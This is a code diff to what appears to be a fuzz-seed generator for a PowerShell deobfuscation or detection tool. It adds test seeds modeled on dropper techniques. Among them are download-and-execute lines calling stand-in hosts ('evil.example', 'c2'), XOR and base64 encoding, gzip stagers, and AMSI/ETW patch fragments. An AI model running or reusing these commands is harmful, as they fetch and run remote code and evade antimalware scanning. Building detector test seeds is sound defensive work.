@@ -41,6 +41,33 @@ const POWERSHELL_TECHNIQUE_CATALOG = Object.freeze([
   'PowerShell -bxor Inline-Key Decode',
   'PowerShell [scriptblock]::Create',
   'PowerShell AMSI Bypass',
+  // ── Phase B additions: variable-backed sinks ───────────────────────
+  // Every literal-argument PowerShell sink gained a $-argument twin
+  // that resolves through ps-mini's symbol table + the shared
+  // `_psResolveArgToken` helper. Decoded output is identical in shape
+  // to the literal branches.
+  'PowerShell Variable Resolution (call-operator)',
+  'PowerShell -EncodedCommand (var)',
+  'PowerShell [Convert]::FromBase64String + UTF8.GetString (var)',
+  'PowerShell [Convert]::FromBase64String + UNICODE.GetString (var)',
+  'PowerShell [Convert]::FromBase64String + ASCII.GetString (var)',
+  'PowerShell [Convert]::FromBase64String + UTF7.GetString (var)',
+  'PowerShell [Convert]::FromBase64String + BIGENDIANUNICODE.GetString (var)',
+  'PowerShell [scriptblock]::Create (var)',
+  // ── Phase C additions: bounded string/byte ops ─────────────────────
+  // Variable-key XOR mirror of the inline-key branch; resolves the
+  // key via ps-mini's `_psResolveIntValue`.
+  'PowerShell -bxor Inline-Key Decode (var-key)',
+  // ── Phase D additions: layered decode + reflective AMSI/ETW ────────
+  // Gzip / Deflate stager decode via Decompressor.inflateSync, inline-
+  // key SecureString structural recognition, broadened AMSI/ETW
+  // reflective-patch family, and the reflective
+  // `[ScriptBlock].GetMethod("Create",...).Invoke` form.
+  'PowerShell Gzip Stager',
+  'PowerShell Deflate Stager',
+  'PowerShell SecureString Decode',
+  'PowerShell AMSI/ETW Reflective Patch',
+  'PowerShell [scriptblock]::Create (reflection)',
 ]);
 
 function makeRng(seed) {
@@ -402,6 +429,152 @@ function genAmsiBypass() {
   return out;
 }
 
+// ── Phase B-D additions ───────────────────────────────────────────────────
+
+function genVarBackedSinks() {
+  // Variable-backed twins of the canonical literal-arg PowerShell sinks.
+  // Each seed assigns the sink argument to a $var (or $env:) first,
+  // then invokes the sink with that var — the shape post-2022 droppers
+  // use to dodge literal-string matching.
+  const out = [];
+  const payload = 'Invoke-Expression (iwr http://evil.example/p.ps1)';
+  const b64u16 = _toBase64Utf16LE(payload);
+  const b64u8 = _toBase64Utf8(payload);
+
+  // -EncodedCommand $var / ${var}
+  out.push(makeSeed(`$b = '${b64u16}'; powershell.exe -enc $b`, 'Invoke-Expression'));
+  out.push(makeSeed(`$\{b64\} = "${b64u16}"; pwsh -EncodedCommand \${b64}`, 'Invoke-Expression'));
+
+  // FromBase64String($var) + Encoding.GetString
+  out.push(makeSeed(
+    `$x = '${b64u8}'; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x))`,
+    'Invoke-Expression',
+  ));
+  out.push(makeSeed(
+    `$x = "${b64u16}"; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($x))`,
+    'Invoke-Expression',
+  ));
+
+  // [scriptblock]::Create($var)
+  out.push(makeSeed(
+    `$sb = '${payload}'; [scriptblock]::Create($sb).Invoke()`,
+    'Invoke-Expression',
+  ));
+  out.push(makeSeed(
+    `$s = "${payload}"; ([ScriptBlock]::Create($s))`,
+    'Invoke-Expression',
+  ));
+
+  // Paren-less call-operator: & $cmd / iex $cmd / Invoke-Expression $cmd
+  out.push(makeSeed(`$cmd = 'Invoke-Expression'; & $cmd 'arg'`, 'Invoke-Expression'));
+  out.push(makeSeed(`$c = 'Invoke-Expression'; iex $c`, 'Invoke-Expression'));
+  out.push(makeSeed(`$c = 'Invoke-Expression'; . $c 'arg'`, 'Invoke-Expression'));
+  out.push(makeSeed(
+    `$sb = '${payload}'; Invoke-Command -ScriptBlock $sb`,
+    'Invoke-Expression',
+  ));
+  return out;
+}
+
+function genVarKeyXor() {
+  // -bxor $key (variable-held) mirror of the inline-key XOR branch.
+  const out = [];
+  const payloads = [
+    'Invoke-Expression iex',
+    'powershell.exe -Command whoami',
+  ];
+  const keys = [0x5a, 0x42];
+  for (const pl of payloads) {
+    for (const k of keys) {
+      const enc = [...pl].map(c => (c.charCodeAt(0) ^ k).toString()).join(',');
+      out.push(makeSeed(
+        `$k = ${k}; @(${enc}) | ForEach-Object { $_ -bxor $k }`,
+        pl.slice(0, 8),
+      ));
+      out.push(makeSeed(
+        `$key = 0x${k.toString(16)}; @(${enc}) | % { $_ -bxor $key }`,
+        pl.slice(0, 8),
+      ));
+    }
+  }
+  return out;
+}
+
+function genGzipDeflateStager() {
+  // Gzip / Deflate stager — pre-computed compressed base64 payload.
+  // The payloads here are short, deterministic, and contain exec-intent
+  // keywords so the decoder's printable-ratio + _EXEC_INTENT_RE gates
+  // admit them. The seeds deliberately do NOT run zlib at seed-build
+  // time (pako/zlib aren't loaded here) — they use fixture strings that
+  // parse as base64 but won't actually inflate inside the fuzz harness
+  // (which lacks Decompressor). The runtime fuzz target only asserts
+  // candidate shape + amp budget, not successful decode, so structural
+  // fuzzing here is still productive.
+  const out = [];
+  const fakeB64 = 'H4sIAAAAAAAEA' + 'A'.repeat(32) + '=';
+  out.push(makeSeed(
+    `$b = [Convert]::FromBase64String('${fakeB64}'); $ms = New-Object IO.MemoryStream(,$b); $gz = New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress); iex (New-Object IO.StreamReader($gz)).ReadToEnd()`,
+    null,
+  ));
+  out.push(makeSeed(
+    `$b = [Convert]::FromBase64String('${fakeB64}'); $ms = New-Object IO.MemoryStream(,$b); $df = New-Object IO.Compression.DeflateStream($ms,[IO.Compression.CompressionMode]::Decompress); iex (New-Object IO.StreamReader($df)).ReadToEnd()`,
+    null,
+  ));
+  return out;
+}
+
+function genSecureStringInlineKey() {
+  // ConvertTo-SecureString with inline -Key @(...) byte array.
+  // Structural recognition only — no inline decryption.
+  const out = [];
+  const key128 = Array.from({ length: 16 }, (_, i) => (i * 7) & 0xff).join(',');
+  const key256 = Array.from({ length: 32 }, (_, i) => (i * 13) & 0xff).join(',');
+  const ct = 'A'.repeat(32);
+  out.push(makeSeed(
+    `ConvertTo-SecureString -String '${ct}' -Key @(${key128})`,
+    null,
+  ));
+  out.push(makeSeed(
+    `ConvertTo-SecureString '${ct}' -Key @(${key256})`,
+    null,
+  ));
+  return out;
+}
+
+function genAmsiEtwReflective() {
+  // Broadened AMSI / ETW reflective patch family.
+  const out = [];
+  out.push(makeSeed(
+    `$addr = [Runtime.InteropServices.Marshal]::GetProcAddress($amsi, 'AmsiScanBuffer'); [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [PatchDelegate])`,
+    'AmsiScanBuffer',
+  ));
+  out.push(makeSeed(
+    `$p = [Marshal]::GetProcAddress($ntdll, "EtwEventWrite"); VirtualProtect($p, 1, 0x40, [ref]$old)`,
+    'EtwEventWrite',
+  ));
+  return out;
+}
+
+function genReflectiveScriptBlock() {
+  // [ScriptBlock].GetMethod("Create", ...).Invoke($null, @(body))
+  const out = [];
+  const bodies = [
+    'Invoke-Expression (iwr http://e/p)',
+    'IEX (New-Object Net.WebClient).DownloadString("http://c2/s")',
+  ];
+  for (const body of bodies) {
+    out.push(makeSeed(
+      `[System.Management.Automation.ScriptBlock].GetMethod("Create", [Type[]]@([string])).Invoke($null, @('${body}'))`,
+      'Invoke-Expression',
+    ));
+    out.push(makeSeed(
+      `$m = [ScriptBlock].GetMethod("Create", [Type[]]@([string])); $m.Invoke($null, @('${body}'))`,
+      'Invoke-Expression',
+    ));
+  }
+  return out;
+}
+
 function generatePowerShellSeeds() {
   const rng = makeRng(0x50E1100A);
   return [
@@ -418,6 +591,13 @@ function generatePowerShellSeeds() {
     ...genBxorInlineKey(),
     ...genScriptBlockCreate(),
     ...genAmsiBypass(),
+    // Phase B-D additions
+    ...genVarBackedSinks(),
+    ...genVarKeyXor(),
+    ...genGzipDeflateStager(),
+    ...genSecureStringInlineKey(),
+    ...genAmsiEtwReflective(),
+    ...genReflectiveScriptBlock(),
   ];
 }
 
